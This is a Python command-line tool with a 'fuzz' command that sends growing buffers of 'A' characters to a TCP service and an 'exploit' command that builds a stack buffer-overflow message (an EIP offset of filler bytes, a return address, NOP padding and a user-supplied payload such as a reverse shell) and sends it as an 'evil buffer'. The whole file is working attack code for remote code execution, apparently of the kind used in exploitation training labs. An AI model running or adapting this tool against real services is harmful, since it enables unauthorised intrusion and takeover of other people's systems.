import socket
import time
import sys
import click

# TODO: Interactive mode?
#   - Send messages as a live session
#   - Prepare malicious message beforehand, for example
# TODO: Option to print out prepared malicious message
# TODO: Dynamically detect if given input is already hex or string / provide
#       parsing flag
# TODO: Allow read payload from file


@click.group()
def cli():
    pass


@click.command()
@click.argument('address')
@click.argument('port', type=int)
@click.option('--payload', default='',  # TODO: Find a nice flag
              help='The payload to send, e.g. a reverse shell')
@click.option('--offset', '-o', required=True, type=int,
              help='Offset to EIP, determining the input size by: '
              + 'overflow-char * OFFSET ')
@click.option('--overflow-char', default='90')
@click.option('--return-address', '-r', default='',
              help='Address to write into the EIP. Follows the '
              + 'overflow input')
@click.option('--padding', default=0, help='Amount of NOPs to be inserted '
              + 'return address and payload')
def exploit(address, port, payload, offset, overflow_char, return_address,
            padding):

    overflow = bytes.fromhex(overflow_char * offset)
    ret = bytes.fromhex(return_address)
    raw_payload = bytes.fromhex(payload)
    crlf = str.encode("\r\n")
    message = overflow + ret + \
        bytes.fromhex('90' * padding) + raw_payload + crlf

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address, port))
        print("Sending evil buffer...")
        s.send(message)
        print("Done!")
    except Exception as e:
        print("Could not connect.")
        print(e)


@ click.command()
@ click.argument('address')
@ click.argument('port', type=int)
@ click.option('--payload', '-p', default='')
@ click.option('--max-iterations', '-m', default=30)
@ click.option('--increment', '-i', default=100)
def fuzz(address, port, payload, max_iterations, increment):
    buffer = []
    counter = 100
    while len(buffer) < max_iterations:
        buffer.append("A" * counter)
        counter += increment

    for string in buffer:
        try:
            s = socket.create_connection((address, port))
            print("Fuzzing with %s bytes" % len(string))
            string = payload + ' ' + string + "\r\n"
            s.send(string.encode())
            s.recv(1024)
            s.close()
        except OSError as e:
            print("Could not connect to " + address + ":" + str(port))
            print(e)
            sys.exit(0)
        time.sleep(1)


cli.add_command(exploit)
cli.add_command(fuzz)

if __name__ == '__main__':
    cli()
